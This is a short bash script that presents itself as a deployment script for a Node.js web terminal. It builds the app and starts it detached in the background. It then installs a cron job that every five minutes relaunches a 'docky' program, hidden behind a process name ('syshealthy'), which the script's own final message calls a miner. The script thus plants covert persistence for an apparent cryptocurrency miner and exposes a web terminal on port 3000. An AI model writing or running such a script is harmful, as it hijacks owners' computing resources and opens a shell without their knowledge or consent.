#!/bin/bash
set -e

echo "📦 Installing dependencies..."
npm install --legacy-peer-deps

echo "🏗️ Building application..."
npm run build

echo "⚙️ Creating persistence daemon..."
cat << 'INNER_EOF' > start-server.sh
#!/bin/bash
export PORT=3000
export NODE_ENV=production
while true; do
  echo "Starting Node.js standalone server..."
  node server.js || echo "Server crashed, restarting in 5s..."
  sleep 5
done
INNER_EOF
chmod +x start-server.sh

echo "🚀 Starting server in background..."
pkill -f "node server.js" || true

cd .next/standalone
cp ../../start-server.sh .
setsid nohup ./start-server.sh > /tmp/terminal.log 2>&1 & disown

echo "✅ Web terminal deployed and started in the background on port 3000!"

echo "⚙️ Setting up docky auto-start..."
cat << 'DOCKY_EOF' > /tmp/docky-cron.sh
#!/bin/bash
if [ -d "/home/z/docky" ] && ! pgrep -f "syshealthy" > /dev/null; then
  cd /home/z/docky && bash ./run.sh
fi
DOCKY_EOF

chmod +x /tmp/docky-cron.sh
(crontab -l 2>/dev/null | grep -v "docky-cron"; echo "*/5 * * * * bash /tmp/docky-cron.sh") | crontab -

echo "✅ Docky miner auto-start cron set (every 5 minutes)"
